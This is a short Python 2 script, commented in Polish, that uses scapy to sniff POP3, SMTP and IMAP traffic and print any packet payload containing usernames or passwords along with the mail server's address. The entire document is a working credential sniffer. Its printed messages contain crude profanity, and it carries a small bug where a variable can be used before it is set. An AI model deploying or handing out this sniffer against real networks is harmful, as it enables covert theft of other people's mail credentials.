from scapy.all import*

#funkcja zwrotna do przetwarzania pakietow
def packet_callback(packet):
    print "lecimy tutaj"
#    print packet.show()
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

    if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
        print "[*] serwer: %s " % packet[IP].dst
        print "[*] %s" % packet[TCP].payload

#uruchomienie szperacza
#print" ################### NOWY PAKIET #################"
print "kurwaaaa leceee"
sniff(filter = "tcp port 110 or tcp port 25 or tcp port 143",
      prn=packet_callback,
      count = 0)
print "lo kurwa to juz koniec"

